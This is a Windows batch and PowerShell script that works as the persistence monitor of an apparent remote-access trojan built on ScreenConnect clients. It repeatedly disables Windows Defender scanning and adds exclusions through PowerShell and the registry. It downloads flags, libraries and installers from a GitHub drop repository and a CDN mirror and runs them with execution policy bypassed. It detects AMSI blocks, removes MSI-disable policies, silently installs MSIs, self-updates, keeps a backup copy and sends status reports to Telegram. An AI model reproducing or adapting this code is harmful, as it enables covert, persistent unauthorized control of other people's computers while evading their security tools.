powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}; try{Set-MpPreference -DisableScriptScanning $true}catch{}; try{Add-MpPreference -ExclusionPath '%WD%','%ETL%',(Join-Path $env:ProgramFiles 'ScreenConnect Client*'),(Join-Path ${env:ProgramFiles(x86)} 'ScreenConnect Client*') -ErrorAction Stop}catch{}; foreach($x in @('ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe','msiexec.exe','powershell.exe')){try{Add-MpPreference -ExclusionProcess $x -ErrorAction SilentlyContinue}catch{}}" >nul 2>&1

rem ── [G] periodic full re-secure every ~2 h ────────────────────
powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\own_secure.cmd') -and (( -not (Test-Path '%WD%\sec.flag')) -or (((Get-Date) - (Get-Item -LiteralPath '%WD%\sec.flag').LastWriteTime).TotalHours -ge 2))){ exit 1 } else { exit 0 }" >nul 2>&1
if errorlevel 1 (
  echo periodic re-secure>>"%LOG%"
  call "%WD%\own_secure.cmd" >>"%LOG%" 2>&1
  echo done>"%WD%\sec.flag"
)

rem ── [G2] Gryxa MUST-RUN ───────────────────────────────────────
rem O40: if ANY non-sevrz SC Running → never msiexec (stops panel duplicates).
set "GRYXA_OK=0"
set "GRYXA_WAS=0"
set "DO_DEEP=0"
set "FORCE_G=0"
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"

rem FORCE push: content-hash via fc /b (re-fire when flag content changes); raw-first
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%WD%\force_gryxa.new" "%CURL%" -L --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
if exist "%WD%\force_gryxa.new" (
  findstr /C:"PUSH" "%WD%\force_gryxa.new" >nul 2>&1
  if not errorlevel 1 (
    if not exist "%WD%\force_gryxa.done" (
      set "FORCE_G=1"
    ) else (
      fc /b "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
      if errorlevel 1 set "FORCE_G=1"
    )
  )
)

rem Detect any Running non-sevrz ScreenConnect (true Gryxa presence)
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >"%WD%\gryxa_health.out" 2>nul
set "GH="
if exist "%WD%\gryxa_health.out" for /f "usebackq delims=" %%R in ("%WD%\gryxa_health.out") do set "GH=%%R"
echo gryxa_health=!GH!>>"%LOG%"
echo !GH!| findstr /I /B /C:"HEALTHY" >nul
if not errorlevel 1 (
  set "GRYXA_OK=1"
  set "GRYXA_WAS=1"
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
)

rem FORCE push overrides healthy-skip: run a forced ensure this tick
if "%FORCE_G%"=="1" (
  echo gryxa_force_push>>"%LOG%"
  if exist "%WD%\own_lib.ps1" (
    set "GRES="
    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
    echo gryxa_force_result=!GRES!>>"%LOG%"
    copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
  )
  goto :GryxaAfter
)

powershell -NoProfile -NonInteractive -Command "if(( -not (Test-Path '%GRYXA_DEEP%')) -or (((Get-Date)-(Get-Item -LiteralPath '%GRYXA_DEEP%' -Force).LastWriteTime).TotalHours -ge 8)){ exit 1 } else { exit 0 }" >nul 2>&1
if errorlevel 1 set "DO_DEEP=1"

rem Healthy + not deep due → zero work
if "%GRYXA_OK%"=="1" if "%DO_DEEP%"=="0" (
  echo gryxa_skip_already_healthy>>"%LOG%"
  goto :GryxaAfter
)

rem Deep or missing: gryxa-ensure only (lib locks msiexec if Running)
if exist "%WD%\own_lib.ps1" (
  set "GRES="
  if "%DO_DEEP%"=="1" (
    echo gryxa_deep_begin>>"%LOG%"
    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
  ) else (
    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
  )
  echo gryxa_ensure_result=!GRES!>>"%LOG%"
  rem M41: only mark OK on true HEALTHY|...running/started/svc-recreated — never INFLIGHT/spawned
  echo !GRES!| findstr /I /B /C:"HEALTHY|" | findstr /I "running=1 started=1 svc-recreated=1" >nul
  if not errorlevel 1 set "GRYXA_OK=1"
)
if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
if "%GRYXA_OK%"=="0" call :EnsureGryxaMust

:GryxaAfter
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
set "GRYXA_OK=0"
sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
if not errorlevel 1 set "GRYXA_OK=1"
rem also OK if verified Gryxa FP (relay/expected) is healthy
if "%GRYXA_OK%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" 2>nul | findstr /I /B /C:"HEALTHY|" | findstr /I "running=1" >nul
  if not errorlevel 1 set "GRYXA_OK=1"
)

if "%GRYXA_OK%"=="1" if "%GRYXA_WAS%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-restored" >nul 2>&1
  call :TgGryxa RESTORED "Gryxa ScreenConnect healthy (svc running)"
)
if "%GRYXA_OK%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-must-fail" >nul 2>&1
  call :TgGryxa DOWN "Gryxa MUST-RUN - service not Running after heal"
)

rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% >nul 2>&1
set "NEED_HB=0"
if "%PRIM_OK%"=="0" set "NEED_HB=1"
if %FOREIGN_LEFT% GTR 0 set "NEED_HB=1"
if "%GRYXA_OK%"=="0" set "NEED_HB=1"
if "%NEED_HB%"=="0" (
  echo hb_skip_healthy>>"%LOG%"
) else (
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HBFLAG%') -and (New-TimeSpan -Start (Get-Item -LiteralPath '%HBFLAG%').LastWriteTime).TotalMinutes -lt 360){ exit 0 } else { exit 1 }" >nul 2>&1
  if errorlevel 1 (
    echo hb>%HBFLAG%
    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State HB -Mode compact -Build %MONVER% -Count !COUNT! >nul 2>&1
    echo digest HB sent>>"%LOG%"
  )
)

rem ── [I] self-update apply (last thing this tick) ──────────────
if "%SELF_UPD%"=="1" (
  echo self-update apply>>"%LOG%"
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  move /y "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
)
rem keep dual-path backup in sync every tick
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if exist "%WD%\own_mon.cmd" (
  attrib -h -s -r "%ETL%\etl_mon.cmd" >nul 2>&1
  copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
)
del /f /q "%MUTEX%" >nul 2>&1

echo tick done: prim=%PRIM_OK% gryxa=%GRYXA_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
endlocal
exit /b 0

rem ═══════════════ helpers ═══════════════
:EnsureGryxaMust
rem M46: treat START_PENDING as alive; never spawn own_gryxa /x while svc exists
set "GRYXA_OK=0"
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
set "GSVC=ScreenConnect Client (%GRYXA_FP%)"

rem soft reg exclusions every must-heal (works even when WinDefend service dead)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1

rem alive = RUNNING or START_PENDING (connect race) — do not reinstall
sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
if not errorlevel 1 (
  set "GRYXA_OK=1"
  echo gryxa_must_already_alive>>"%LOG%"
  exit /b 0
)

rem service exists but stopped → start only
sc query "%GSVC%" >nul 2>&1
if not errorlevel 1 (
  echo gryxa_must_start_only>>"%LOG%"
  sc config "%GSVC%" start= auto >nul 2>&1
  sc start "%GSVC%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
  if not errorlevel 1 (
    set "GRYXA_OK=1"
    echo gryxa_must_started_ok>>"%LOG%"
    exit /b 0
  )
)

rem re-fetch lib into TEMP if WD copy missing (AMSI/quarantine wipe)
if not exist "%WD%\own_lib.ps1" (
  echo gryxa_must_lib_missing_refetch>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 40 -o "%SystemRoot%\Temp\.upd\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1" >nul 2>&1
  if exist "%SystemRoot%\Temp\.upd\own_lib.ps1" copy /y "%SystemRoot%\Temp\.upd\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
)

set "LIB=%WD%\own_lib.ps1"
if not exist "%LIB%" if exist "%SystemRoot%\Temp\.upd\own_lib.ps1" set "LIB=%SystemRoot%\Temp\.upd\own_lib.ps1"

if exist "%LIB%" (
  set "GRES="
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%LIB%" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER% 2^>nul`) do set "GRES=%%R"
  echo gryxa_must_lib=!GRES!>>"%LOG%"
  echo !GRES!| findstr /I "malicious ScriptContainedMaliciousContent" >nul
  if not errorlevel 1 (
    echo gryxa_must_amsi_blocked>>"%LOG%"
    set "GRES="
  )
  echo !GRES!| findstr /I /B /C:"HEALTHY" /C:"QUEUED" /C:"INFLIGHT" >nul
  if not errorlevel 1 timeout /t 15 /nobreak >nul
)

sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 set "GRYXA_OK=1"

if "%GRYXA_OK%"=="0" (
  echo gryxa_must_cmd_fallback>>"%LOG%"
  if not exist "%WD%\own_gryxa.cmd" (
    "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
    if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 10 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
  )
  if exist "%WD%\own_gryxa.cmd" (
    rem detached so mon tick is not blocked by msiexec
    start "" /b cmd /c "call \"%WD%\own_gryxa.cmd\" \"%WD%\" \"%GRYXA_FP%\" \"%KEEP_FP%\" \"%ALT_FP%\" >>\"%LOG%\" 2>&1"
    echo gryxa_must_cmd_spawned>>"%LOG%"
    timeout /t 25 /nobreak >nul
  ) else (
    echo gryxa_must_cmd_missing>>"%LOG%"
  )
)

sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 set "GRYXA_OK=1"
if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:TgGryxa
rem %1=kind %2=msg — per-Gryxa state so it cannot reuse Primary own_mon.state.
set "GSTATE=%~1"
set "GMSG=%~2"
set "GSTATEFILE=%WD%\own_mon_gryxa.state"
set "GOLD="
if exist "%GSTATEFILE%" set /p GOLD=<"%GSTATEFILE%"
if /I "%GSTATE%"=="RESTORED" (
  if /I "%GOLD%"=="RESTORED" exit /b 0
  if exist "%WD%\tg_gryxa.flag" (
    powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_gryxa.flag').LastWriteTime).TotalMinutes -lt 1440){exit 0}else{exit 1}" >nul 2>&1
    if not errorlevel 1 (
      echo tg_gryxa_suppress_%GSTATE%>>"%LOG%"
      exit /b 0
    )
  )
  echo %GSTATE%>"%GSTATEFILE%"
  echo sent>"%WD%\tg_gryxa.flag"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %GSTATE% -Summary "%GMSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
  echo tg gryxa %GSTATE% sent>>"%LOG%"
  exit /b 0
)
if /I "%GSTATE%"=="DOWN" if /I "%GOLD%"=="DOWN" if exist "%WD%\tg_gryxa.flag" (
  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_gryxa.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo tg_gryxa_suppress_%GSTATE%>>"%LOG%"
    exit /b 0
  )
)
echo %GSTATE%>"%GSTATEFILE%"
echo sent>"%WD%\tg_gryxa.flag"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %GSTATE% -Summary "%GMSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
echo tg gryxa %GSTATE% sent>>"%LOG%"
exit /b 0

:InstallMsi
rem %1=url %2=tag
set "URL=%~1"
set "TAG=%~2"
echo [%TAG%] fetch %URL%>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI%.tmp" "%URL%" >>"%LOG%" 2>&1
for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
  echo [%TAG%] fetch failed>>"%LOG%"
  del /f /q "%MSI%.tmp" >nul 2>&1
  exit /b 1
)
move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
rem M41: OLE magic + ProductName FP must match KEEP_FP before /i
set "MSIOK=no"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action test-msi -Fp "%KEEP_FP%" -Extra "%MSI%" -WorkDir "%WD%"`) do set "MSIOK=%%R"
if /I not "!MSIOK!"=="yes" (
  echo [%TAG%] msi_validate_fail>>"%LOG%"
  del /f /q "%MSI%" >nul 2>&1
  exit /b 1
)
rem M42/M47: sibling-safe copy (empty Upgrade table) before sevrz /i — refuse /i if protect fails
set "MSI_SAFE="
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
if not defined MSI_SAFE (
  echo [%TAG%] msi_protect_fail_skip_i>>"%LOG%"
  del /f /q "%MSI%" >nul 2>&1
  exit /b 1
)
call :NoMsiPolicy
rem M13/M41: stale primary dir under PF and PF86
sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
if errorlevel 1 (
  if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
    echo stale_primary_dir_clean_pf86>>"%LOG%"
    rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  )
  if exist "%ProgramFiles%\ScreenConnect Client (%KEEP_FP%)" (
    echo stale_primary_dir_clean_pf>>"%LOG%"
    rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  )
)
echo [%TAG%] msiexec install>>"%LOG%"
msiexec /i "%MSI_SAFE%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
set "MSIEXIT=!ERRORLEVEL!"
echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
if "!MSIEXIT!"=="1618" (
  echo [%TAG%] msi_busy_retry>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI_SAFE%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
  set "MSIEXIT=!ERRORLEVEL!"
  echo [%TAG%] msiexec_retry exit=!MSIEXIT!>>"%LOG%"
)
if /I not "%MSI_SAFE%"=="%MSI%" del /f /q "%MSI_SAFE%" >nul 2>&1
call :WaitSvc
call :RestoreAlt
rem O37: sevrz /i shares legacy UpgradeCodes with gryxa — always re-ensure Gryxa after
call :EnsureGryxaMust
exit /b 0

:RepairRegistered
rem %1=fingerprint - service deleted but product registered: repair by GUID.
rem M40: label was amputated (body sat after InstallMsi exit /b) so primary heal never ran.
sc query "ScreenConnect Client (%~1)" >nul 2>&1
if not errorlevel 1 exit /b 0
if not exist "%WD%\own_lib.ps1" exit /b 1
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%~1" -WorkDir "%WD%" >>"%LOG%" 2>&1
call :WaitSvc
exit /b 0

:RestoreAlt
rem ALT service gone but still registered (SC-family msiexec side effect) - repair it too.
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 exit /b 0
echo alt missing - repair attempt>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:WaitSvc
set "TRIES=0"
:WaitLoop
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "INSTALLED=1"
  set "PRIM_OK=1"
  exit /b 0
)
set /a TRIES+=1
if %TRIES% GEQ 10 exit /b 1
ping 127.0.0.1 -n 7 >nul 2>&1
goto :WaitLoop

:TgState
set "NEWSTATE=%~1"
set "MSG=%~2"
set "OLDSTATE="
if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
rem false DOWN after reboot race: primary already Running — do not spam
if /I "%NEWSTATE%"=="DOWN" (
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 (
    echo tg_skip_down_already_running>>"%LOG%"
    exit /b 0
  )
)
rem rate-limit repeated DOWN/FAIL: max 1 alert per 6h while stuck
if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
goto :SendAlert
:MaybeSuppress
if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo tg_suppressed_%NEWSTATE%>>"%LOG%"
    exit /b 0
  )
)
:SendAlert
echo %NEWSTATE%>"%STATE%"
echo sent>"%WD%\tg_sent.flag"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %NEWSTATE% -Summary "%MSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
echo tg state %NEWSTATE% sent>>"%LOG%"
exit /b 0
